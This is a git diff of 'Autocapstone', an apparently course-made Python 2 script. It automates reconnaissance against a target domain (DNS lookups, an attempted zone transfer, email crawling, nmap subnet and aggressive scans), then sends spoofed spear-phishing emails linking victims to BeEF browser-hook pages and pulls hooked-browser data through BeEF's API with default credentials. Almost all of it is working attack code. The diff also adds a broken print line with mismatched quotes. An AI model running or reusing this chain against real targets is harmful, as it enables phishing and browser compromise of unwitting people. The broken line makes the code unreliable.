@@ -1,4 +1,11 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+
+##################################################################
+# Autocapstone v0.4
+# Created for the OMA course from Parrot Labs at KEYW Corporation.
+# https://github.com/vesche
+##################################################################
 
 import json
 import os
@@ -7,50 +14,54 @@ import sys
 import time
 from email_crawl import crawl
 
+
+# email template
+email_text = '''Hey there!<br/ >
+
+I'm new in the office and ran into this webpage, what is this?<br/ >
+
+<a href="http://192.168.169.140:3000/demos/{}.html">link</a><br/ >
+
+Thanks so much,<br/ >
+Mike Robinson'''
+
+
 def write_cmd(cmd, file_name):
-    with open('{}.txt'.format(file_name), 'w') as f:
+    with open("{}.txt".format(file_name), 'w') as f:
         f.write(os.popen(cmd).read())
 
+
 def prompt_stop():
-    prompt = raw_input('Continue (y/n)? ')
+    prompt = raw_input("Continue (y/n)? ")
     if prompt[0].lower() == 'n':
         sys.exit(1)
 
-if __name__ == "__main__":
-    # email template
-    email_text = '''Hey there!<br/ >
 
-    I'm new in the office and ran into this webpage, what is this?<br/ >
-
-    <a href="http://192.168.169.140:3000/demos/{}.html">link</a><br/ >
-
-    Thanks so much,<br/ >
-    Mike Robinson'''
-
-    print '----------------------------------'
-    print 'Autocapstone v0.3 - Austin Jackson'
-    print '----------------------------------'
-    url = raw_input('Url? ')
+def main():
+    print "----------------------------------"
+    print "Autocapstone v0.3 - Austin Jackson"
+    print "----------------------------------"
+    url = raw_input("Url? ")
 
     ##### PHASE 1
-    print '\n------INFORMATION-GATHERING-------'
-    print 'Performing nslookup...'
-    write_cmd('nslookup {}'.format(url), 'nslookup')
-    print 'Performing whois...'
-    write_cmd('whois {}'.format(url), 'whois')
-    print 'Finding nameservers...'
-    write_cmd('dig {} NS'.format(url), 'nameservers')
+    print "\n------INFORMATION-GATHERING-------"
+    print "Performing nslookup..."
+    write_cmd("nslookup {}".format(url), "nslookup")
+    print "Performing whois..."
+    write_cmd("whois {}".format(url), "whois")
+    print "Finding nameservers...'
+    write_cmd("dig {} NS".format(url), "nameservers")
 
     # get web server ip
-    with open('nslookup.txt', 'r') as f:
+    with open("nslookup.txt", 'r') as f:
         web_ip = f.read().split()[-1]
         if len(web_ip.split('.')) != 4:
-            print 'nslookup failed, url not up?'
+            print "nslookup failed, url not up?"
             prompt_stop()
-    print 'IP of web server found.'
+    print "IP of web server found."
 
     # get name server ip
-    with open('nameservers.txt', 'r') as f:
+    with open("nameservers.txt", 'r') as f:
         for line in f.readlines():
             if line[0] != ';':
                 try:
@@ -63,29 +74,29 @@ if __name__ == "__main__":
     # check if nameserver was found
     try:
         ns_ip
-        print 'IP of name server found.'
+        print "IP of name server found."
     except NameError:
-        print 'Name server could not be found.'
+        print "Name server could not be found."
         prompt_stop()
 
     # attempt zone transfer
     try:
-        write_cmd('dig @{0} {1} AXFR'.format(ns_ip, url), 'zonetransfer')
-        print 'Zone Transfer was successful.'
+        write_cmd("dig @{0} {1} AXFR".format(ns_ip, url), "zonetransfer")
+        print "Zone Transfer was successful."
     except NameError:
-        print 'Zone Transfer failed.'
+        print "Zone Transfer failed."
         prompt_stop()
 
     # crawl website for emails
-    print 'Crawling the website for emails!'
+    print "Crawling the website for emails!"
     crawl(url)
 
     # get mail server IP
-    with open('zonetransfer.txt') as f:
+    with open("zonetransfer.txt") as f:
         for line in f.readlines():
             try:
                 ip = line.split()[-1]
-                if  ('mail' in line) and \
+                if  ("mail" in line) and \
                     (ip.split('.')[0] == web_ip.split('.')[0]):
                     mail_ip = ip
                     break
@@ -93,30 +104,30 @@ if __name__ == "__main__":
                 continue
 
     ##### PHASE 2
-    print '\n------SCANNING-&-ENUMERATION------'
+    print "\n------SCANNING-&-ENUMERATION------"
 
     # probe scan to gather IP's
     hosts = []
-    subnet = '.'.join(web_ip.split('.')[0:3]) + '.0/24'
-    print 'Performing probe scan on {}...'.format(subnet)
-    write_cmd('nmap -sP {}'.format(subnet), 'nmap_probe')
-    with open('nmap_probe.txt') as f:
+    subnet = '.'.join(web_ip.split('.')[0:3]) + ".0/24"
+    print "Performing probe scan on {}...".format(subnet)
+    write_cmd("nmap -sP {}".format(subnet), "nmap_probe")
+    with open("nmap_probe.txt") as f:
         for line in f.read().splitlines():
-            if 'Nmap scan report' in line:
+            if "Nmap scan report" in line:
                 hosts.append(line.split()[-1])
 
     # scan discovered hosts
-    print 'Agressively scanning hosts (this may take a while)...'
+    print "Agressively scanning hosts (this may take a while)..."
     for host in hosts:
-        print 'Scanning {}'.format(host)
-        write_cmd('nmap -A {}'.format(host), 'nmap_{}'.format(host))
+        print "Scanning {}".format(host)
+        write_cmd("nmap -A {}".format(host), "nmap_{}".format(host))
 
     # get mail server IP
-    with open('zonetransfer.txt') as f:
+    with open("zonetransfer.txt") as f:
         for line in f.readlines():
             try:
                 ip = line.split()[-1]
-                if  ('mail' in line) and \
+                if  ("mail" in line) and \
                     (ip.split('.')[0] == web_ip.split('.')[0]):
                     mail_ip = ip
                     break
@@ -135,17 +146,17 @@ if __name__ == "__main__":
                 fname = victim.split('@')[0]
 
                 # create custom redirects
-                subprocess.Popen(['cp', \
-                '/usr/share/beef-xss/extensions/demos/html/redirect.html', \
-                '/usr/share/beef-xss/extensions/demos/html/{}.html'.format(\
+                subprocess.Popen(["cp", \
+                "/usr/share/beef-xss/extensions/demos/html/redirect.html",
+                "/usr/share/beef-xss/extensions/demos/html/{}.html".format(\
                 fname)])
 
-                with open('/root/scripts/fake_email.html', 'w') as f:
+                with open("/root/scripts/fake_email.html", 'w') as f:
                     f.write(email_text.format(fname))
 
-                email_cmd = list('sendemail -f mrobinson@{0} -t {1} \
+                email_cmd = list("sendemail -f mrobinson@{0} -t {1} \
                 -u \"Hello!\" -s {2}:25 -o message-content-type=html \
-                -o message-file=/root/scripts/fake_email.html'.format(\
+                -o message-file=/root/scripts/fake_email.html".format(\
                 url, victim, mail_ip).split())
                 subprocess.Popen(email_cmd)
 
@@ -157,20 +168,21 @@ if __name__ == "__main__":
         print "Mail server IP was not found, not attempting spear phishing."
 
     # get hooks from beef
-    token = os.popen('curl -H "Content-Type: application/json" -X POST \
-    -d \'{"username":"beef", "password":"beef"}\' \
-    http://127.0.0.1:3000/api/admin/login').read().split('"')[-2]
-    write_cmd('curl http://127.0.0.1:3000/api/hooks?token='+token, 'hooks')
-    with open('hooks.txt', 'r') as f:
+    token = os.popen("curl -H \"Content-Type: application/json\" -X POST \
+    -d '{\"username\":\"beef\", \"password\":\"beef\"}' \
+    http://127.0.0.1:3000/api/admin/login").read().split('"')[-2]
+    write_cmd("curl http://127.0.0.1:3000/api/hooks?token="+token, "hooks")
+    with open("hooks.txt", 'r') as f:
         hook_data = json.load(f)
 
     # get sessions for browsers
     beef_data = []
     for n in range(email_count):
         try:
-            session = hook_data['hooked-browsers']['offline'][str(n)]['session']
-            name    = hook_data['hooked-browsers']['offline'][str(n)]\
-                      ['page_uri'][34:-5]
+            session = hook_data["hooked-browsers"]["offline"][str(n)]\
+                      ["session"]
+            name    = hook_data["hooked-browsers"]["offline"][str(n)]\
+                      ["page_uri"][34:-5]
             beef_data.append([session, name])
         except:
             continue
@@ -178,13 +190,17 @@ if __name__ == "__main__":
     # generate files with browser info
     for data in beef_data:
         name = data[1]
-        write_cmd('curl http://127.0.0.1:3000/api/hooks/{0}?token={1}'.format(\
-        name, token), '{}_browser'.format(name))
-        with open('{}_browser.txt'.format(name), 'r') as f:
+        write_cmd("curl http://127.0.0.1:3000/api/hooks/{0}?token={1}".format(\
+        name, token), "{}_browser".format(name))
+        with open("{}_browser.txt".format(name), 'r') as f:
             browser_data = json.load(f)
-        print '{0} using {1} {2}'.format(name, browser_data['BrowserName'], \
-        browser_data['BrowserVersion'])
+        print "{0} using {1} {2}".format(name, browser_data["BrowserName"], \
+        browser_data["BrowserVersion"])
 
-    print '----------------------------------'
-    print 'Done, double check files please!!!'
-    print '----------------------------------'
+    print "----------------------------------"
+    print "Done, double check files please!!!"
+    print "----------------------------------"
+
+
+if __name__ == "__main__":
+    main()
